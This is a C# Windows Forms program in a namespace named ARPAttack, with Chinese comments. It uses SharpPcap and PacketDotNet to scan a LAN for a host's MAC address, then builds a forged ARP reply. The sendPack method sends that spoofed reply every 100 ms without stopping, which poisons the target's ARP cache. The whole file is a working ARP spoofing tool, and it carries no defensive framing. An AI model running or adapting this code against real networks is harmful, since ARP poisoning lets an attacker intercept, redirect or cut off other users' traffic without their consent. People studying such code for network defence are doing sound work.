using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ARPAttack
{
    public partial class Form1 : Form
    {
        LibPcapLiveDeviceList devicesList;

        /// <summary>
        /// 发送的数据包
        /// </summary>
        private byte[] packet;

        /// <summary>
        /// 发送线程
        /// </summary>
        Thread t;

        /// <summary>
        /// 扫描线程
        /// </summary>
        Thread scanThread = null;

        /// <summary>
        /// 发送网卡
        /// </summary>
        LibPcapLiveDevice device;

        /// <summary>
        /// 发送次数
        /// </summary>
        int time = 0;

        /// <summary>
        /// 应答超时限制
        /// </summary>
        TimeSpan timeout = new TimeSpan(0, 0, 1);

        byte[] mIP;
        byte[] sIP;
        byte[] mMAC;
        byte[] sMAC;

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        /// <summary>
        /// 初始化获取网卡列表
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Form1_Load(object sender, EventArgs e)
        {
            devicesList = LibPcapLiveDeviceList.Instance;   //获取本机所有网卡

            if (devicesList.Count < 1)
            {
                throw new Exception("没有发现本机上的网络设备");
            }

            device = devicesList[0];

            combDevice.DataSource = devicesList;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            //信息检查
            if (txtSenderIP.Text.Equals("") || txtSenderMAC.Text.Equals("") || txtRecipientIP.Text.Equals("")) {
                MessageBox.Show("IP或MAC信息不完整");
                return;
            }

            mIP = IPTOBYTE(txtRecipientIP.Text);
            sIP = IPTOBYTE(txtSenderIP.Text);
            sMAC = MACTOBYTE(txtSenderMAC.Text);
            mMAC = MACTOBYTE(txtRecipientMAC.Text);

            if (btnStart.Text.Equals("Start"))
            {
                //Time = 0;
                t = new Thread(new ThreadStart(sendPack));
                t.Start();
                btnStart.Text = "Stop";
            }else
            {
                device.Close();
                t.Abort();
                btnStart.Text = "Start";
            }
        }

        /// <summary>
        /// 获取请求数据包
        /// </summary>
        /// <returns></returns>
        public byte[] getSenderPacket(byte[] yIP, byte[] mIP, byte[] yMAC)
        {
            //ARP请求数据包
            byte[] packet = new byte[] {
                //以太网首部
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff,//目标主机MAC地址      0
                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e,//源主机MAC地址         6
                0x08, 0x06,//帧类型（上层协议类型）ARP请求或应答          12
                
                //ARP帧
                0x00, 0x01,//硬件类型 1表示以太网                         14
                0x08, 0x00,//协议类型 0800表示IP地址                      16
                0x06,//发送端以太网地址长度 6                             18
                0x04,//发送端IP地址长度 4                                 19
                0x00, 0x01,//OP 01请求 02应答                             20
                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e, //发送端硬件地址      22
                0xc0, 0xa8, 0x01, 0x01, 0xe0, 0xcb, //发送端协议（IP）地址28
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,//目的端硬件地址       34
                0x01, 0x63, 0x00, 0x00, 0x00, 0x00,//目的端协议（IP）地址 40

                //剩余18位填充字节没有意义。
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x5d, 0x27, 0xa1, 0xb5 };

            //循环替换IP
            for (int i = 0; i < 4; i++)
            {
                packet[i + 28] = yIP[i];


                packet[i + 40] = mIP[i];
            }

            //循环替换MAC
            for (int i = 0; i < 6; i++)
            {
                packet[i + 6] = yMAC[i];
                packet[i + 22] = yMAC[i];
            }

            return packet;
        }

        /// <summary>
        /// 获取响应数据包
        /// </summary>
        /// <returns></returns>
        public byte[] getPacket(byte[] yIP, byte[] mIP, byte[] yMAC, byte[] mMAC)
        {
            //ARP应答数据包
            byte[] packet = new byte[] {
                //以太网首部
                0xe0, 0xcb, 0x4e, 0x2f, 0x8a, 0xc7,//目标主机MAC地址      0
                0x00, 0x23, 0xcd, 0x34, 0x20,0x0e,//源主机MAC地址         6
                0x08, 0x06,//帧类型（上层协议类型）ARP请求或应答          12
                
                //ARP帧
                0x00, 0x01,//硬件类型 1表示以太网                         14
                0x08, 0x00,//协议类型 0800表示IP地址                      16
                0x06,//发送端以太网地址长度 6                             18
                0x04,//发送端IP地址长度 4                                 19
                0x00, 0x02,//OP 01请求 02应答                             20
                0x00, 0x23, 0xcd, 0x34, 0x20, 0x0e, //发送端硬件地址      22
                0xc0, 0xa8, 0x01, 0x01, 0xe0, 0xcb, //发送端协议（IP）地址28
                0x4e, 0x2f, 0x8a, 0xc7, 0xc0, 0xa8,//目的端硬件地址       34
                0x01, 0x63, 0x00, 0x00, 0x00, 0x00,//目的端协议（IP）地址 40

                //剩余18位填充字节没有意义。
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x5d, 0x27, 0xa1, 0xb5 };

            //循环替换IP
            for (int i = 0; i < 4; i++)
            {
                packet[i + 28] = yIP[i];


                packet[i + 40] = mIP[i];
            }

            //循环替换MAC
            for (int i = 0; i < 6; i++)
            {
                packet[i] = mMAC[i];
                packet[i + 6] = yMAC[i];
                packet[i + 22] = yMAC[i];
                packet[i + 34] = mMAC[i];
            }

            return packet;
        }

        /// <summary>
        /// IP转换成
        /// </summary>
        /// <returns></returns>
        private byte[] IPTOBYTE(string ipstr)
        {
            IPAddress ip;
            bool b = IPAddress.TryParse(ipstr, out ip);

            return ip.GetAddressBytes();
        }

        /// <summary>
        /// OP转Byte[]
        /// </summary>
        /// <param name="i">操作类型 1请求，2应答</param>
        /// <returns></returns>
        byte[] OPtoByte(int i) {
            if (i == 1)
                return new byte[] { 0x00, 0x02 };
            else
                return new byte[] { 0x00, 0x01 };
        }

        /// <summary>
        /// 将MAC地址转换成byte[]
        /// </summary>
        /// <returns></returns>
        private byte[] MACTOBYTE(string macStr)
        {
            string[] macList = macStr.Split('-');

            byte[] macBytes = new byte[6];
            for (int i = 0; i < 6; i++)
            {
                macBytes[i] = (byte)Convert.ToInt32(macList[i], 16);
            }
            return macBytes;

        }

        /// <summary>
        /// 构造请求包
        /// </summary>
        /// <param name="destinationIP">目标主机IP</param>
        /// <param name="localMac">本机MAC</param>
        /// <param name="localIP">本机IP</param>
        /// <returns></returns>
        private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
        {
            // an arp packet is inside of an ethernet packet
            var ethernetPacket = new EthernetPacket(localMac,
                                                    PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                                                    PacketDotNet.EthernetPacketType.Arp);
            var arpPacket = new ARPPacket(PacketDotNet.ARPOperation.Request,
                                          PhysicalAddress.Parse("00-00-00-00-00-00"),
                                          destinationIP,
                                          localMac,
                                          localIP);

            // the arp packet is the payload of the ethernet packet
            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        /// <summary>
        /// 扫描以获取本地局域网的IP和Mac地址映射
        /// </summary>
        public void ScanLAN()
        {
            // 构造Arp请求包,挨个轮询ip
            var arpPackets = BuildRequest(IPAddress.Parse(txtRecipientIP.Text), PhysicalAddress.Parse(txtSenderMAC.Text), IPAddress.Parse(txtSenderIP.Text));

            //创建一个“tcpdump”过滤器，只允许读取arp回复
            String arpFilter = "arp and ether dst " + txtSenderMAC.Text;

            //open the device with 20ms timeout
            device.Open(DeviceMode.Promiscuous, 20);

            //set the filter
            device.Filter = arpFilter;

            scanThread = new System.Threading.Thread(() =>
            {
                var lastRequestTime = DateTime.FromBinary(0);
                var requestInterval = new TimeSpan(0, 0, 1);
                var timeoutDateTime = DateTime.Now + timeout;
                while (DateTime.Now < timeoutDateTime)
                {
                    if (requestInterval < (DateTime.Now - lastRequestTime))
                    {
                        // inject the packet to the wire
                        device.SendPacket(arpPackets);
                        lastRequestTime = DateTime.Now;
                    }

                    //read the next packet from the network
                    var reply = device.GetNextPacket();
                    if (reply == null)
                    {
                        continue;
                    }

                    // parse the packet
                    var packet = PacketDotNet.Packet.ParsePacket(reply.LinkLayerType, reply.Data);

                    // is this an arp packet?
                    var arpPacket = PacketDotNet.ARPPacket.GetEncapsulated(packet);
                    if (arpPacket == null)
                    {
                        continue;
                    }

                    //if this is the reply we're looking for, stop
                    if (arpPacket.SenderProtocolAddress.Equals(txtSenderIP.Text))
                    {
                        txtRecipientMAC.Text = arpPacket.SenderHardwareAddress.ToString();
                        break;
                    }
                }

                device.Close();
                Console.WriteLine("exit scan");
            });
            scanThread.Start();
        }

        /// <summary>
        /// 发送数据
        /// </summary>
        public void sendPack()
        {
            device.Open();
            var timeoutDateTime = DateTime.Now + timeout;

            //构造ARP响应包
            packet = getPacket(sIP, mIP, sMAC, mMAC);

            while (true)
            {
                device.SendPacket(packet);
                time++;
                label6.Text = "the" + time + "time";
                Thread.Sleep(100);
            }

        }

        private void combDevice_SelectedIndexChanged(object sender, EventArgs e)
        {
            // 获取相应的设备网关MAC，IP，本机MAC，IP
            device = devicesList[(sender as ComboBox).SelectedIndex];
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            ScanLAN();
        }
    }
}
